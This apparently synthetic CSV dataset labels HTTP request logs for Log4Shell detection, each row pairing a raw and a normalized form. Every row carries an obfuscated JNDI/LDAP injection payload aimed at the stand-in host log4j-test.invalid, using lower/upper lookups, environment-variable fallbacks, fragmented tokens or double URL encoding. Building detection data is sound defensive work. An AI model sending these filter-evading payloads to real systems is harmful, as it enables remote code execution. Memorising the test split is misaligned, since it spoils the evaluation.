id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000512,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000513,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000514,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://log4j-test.invalid/lower} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000515,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower},request from user-agent: ${jndi:ldap://log4j-test.invalid/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000516,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://log4j-test.invalid/lower},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://log4j-test.invalid/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000517,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000518,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000519,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://log4j-test.invalid/upper} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000520,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper},request from user-agent: ${jndi:ldap://log4j-test.invalid/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000521,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://log4j-test.invalid/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000522,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://log4j-test.invalid/upper} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000523,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000524,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000525,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000526,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://log4j-test.invalid/upper} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000527,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper},request from user-agent: ${jndi:ldap://log4j-test.invalid/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000528,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4j-test.invalid/upper},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://log4j-test.invalid/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000529,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000530,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000531,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://log4j-test.invalid/env} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000532,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env},request from user-agent: ${jndi:ldap://log4j-test.invalid/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000533,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://log4j-test.invalid/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000534,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://log4j-test.invalid/env} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-000535,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-000536,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000537,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000538,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://log4j-test.invalid/env} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000539,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env},request from user-agent: ${jndi:ldap://log4j-test.invalid/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000540,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://log4j-test.invalid/env},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://log4j-test.invalid/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000541,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000542,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000543,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://log4j-test.invalid/frag} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000544,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag},request from user-agent: ${jndi:ldap://log4j-test.invalid/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000545,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://log4j-test.invalid/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000546,2026-05-17,synthetic,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://log4j-test.invalid/frag} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000547,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000548,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000549,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000550,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://log4j-test.invalid/frag} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000551,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag},request from user-agent: ${jndi:ldap://log4j-test.invalid/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000552,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://log4j-test.invalid/frag},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://log4j-test.invalid/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000553,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000554,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000555,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://log4j-test.invalid/double} | method: get | host: app.local | path: /home,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000556,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D,request from user-agent: ${jndi:ldap://log4j-test.invalid/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000557,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://log4j-test.invalid/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000558,2026-05-17,synthetic,GET /search?q=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://log4j-test.invalid/double} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,double_url_encoded,path,unseen_obfuscation_test,critical
LS-000559,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/double},1,log4shell,double_url_encoded,body,unseen_obfuscation_test,critical
LS-000560,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000561,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000562,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flog4j-test.invalid%252Fdouble%257D | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://log4j-test.invalid/double} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
